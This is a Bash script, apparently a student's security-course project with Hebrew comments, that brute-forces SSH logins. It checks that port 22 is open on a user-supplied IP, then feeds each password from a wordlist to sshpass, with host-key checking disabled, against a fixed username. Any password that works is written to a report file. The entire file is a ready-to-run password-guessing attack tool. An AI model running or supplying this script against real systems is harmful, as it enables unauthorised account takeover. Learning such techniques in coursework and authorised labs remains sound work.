#!/bin/bash

# --- פרטי הפרויקט ---
# שם הפרויקט: SSH Ghost Hunter NX201
# שם הסטודנט: יאיר נתניה (Yair Netanya)
# קוד סטודנט: s7
# שם המרצה: צח
# יחידה: PERES25B

# --- צבעים לממשק המשתמש ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
RESET='\033[0m'

# --- הגדרות משתנים ---
TARGET_USER="yair"
SSH_PORT="22"
PASS_FILE="passlist.txt"
RESULTS_DIR="$HOME/Desktop/results_yair"
LOG_PATH="$RESULTS_DIR/found_pass.log"

# יצירת תיקיית תוצאות אם היא לא קיימת
mkdir -p "$RESULTS_DIR"

echo -e "${PURPLE}====================================${RESET}"
echo -e "${PURPLE}   SSH BRUTE-FORCE TOOL - YAIR N.   ${RESET}"
echo -e "${PURPLE}====================================${RESET}"

# 1. קבלת כתובת IP ובדיקת תקינות (Validation)
echo -n "Enter target IP address: "
read TARGET_IP

# בדיקה באמצעות ביטוי רגולרי שה-IP בפורמט תקין
if [[ ! $TARGET_IP =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo -e "${RED}[!] שגיאה: פורמט IP לא תקין.${RESET}"
    exit 1
fi

# 2. בדיקת רשת (בדיקה אם פורט 22 פתוח)
echo -e "${BLUE}[*] סורק את $TARGET_IP בפורט $SSH_PORT...${RESET}"
nc -zv -w 3 "$TARGET_IP" "$SSH_PORT" &>/dev/null

if [[ $? -ne 0 ]]; then
    echo -e "${RED}[!] פורט $SSH_PORT סגור ביעד. היציאה מהסקריפט...${RESET}"
    exit 1
fi
echo -e "${GREEN}[+] השירות זמין, מתחילים בבדיקה.${RESET}"

# 3. בדיקה שקובץ הסיסמאות קיים במערכת
if [[ ! -f "$PASS_FILE" ]]; then
    echo -e "${RED}[!] שגיאה: קובץ הסיסמאות '$PASS_FILE' לא נמצא!${RESET}"
    exit 1
fi

# 4. מנוע ה-Brute Force (לולאת הניחושים)
echo -e "${YELLOW}[*] מתחיל מתקפה על המשתמש: $TARGET_USER...${RESET}"
SUCCESS=0

# קריאת הקובץ שורה אחר שורה
while IFS= read -r PASSWORD; do
    echo -ne "    בודק סיסמה: $PASSWORD \r"
    
    # ניסיון התחברות SSH ללא אינטראקציה
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$TARGET_USER@$TARGET_IP" "exit" &>/dev/null
    
    # אם קוד החזרה הוא 0, סימן שהסיסמה נכונה
    if [[ $? -eq 0 ]]; then
        FINAL_PASS="$PASSWORD"
        SUCCESS=1
        echo -e "\n${GREEN}[SUCCESS] הסיסמה פוצחה: $FINAL_PASS${RESET}"
        break
    fi
done < "$PASS_FILE"

# 5. רישום תוצאות ושמירה ללוג
if [[ $SUCCESS -eq 1 ]]; then
    echo -e "${BLUE}[*] מייצר דוח סיכום...${RESET}"
    {
        echo "--- Security Scan Report ---"
        echo "Date: $(date)"
        echo "Student: Yair Netanya (s7)"
        echo "Target: $TARGET_IP"
        echo "Username: $TARGET_USER"
        echo "Password: $FINAL_PASS"
        echo "---------------------------"
    } > "$LOG_PATH"
    echo -e "${GREEN}[+] הדוח נשמר בנתיב: $LOG_PATH${RESET}"
else
    echo -e "\n${RED}[-] הרשימה הסתיימה. לא נמצאה התאמה.${RESET}"
fi

echo -e "${PURPLE}--- התהליך הסתיים ---${RESET}"
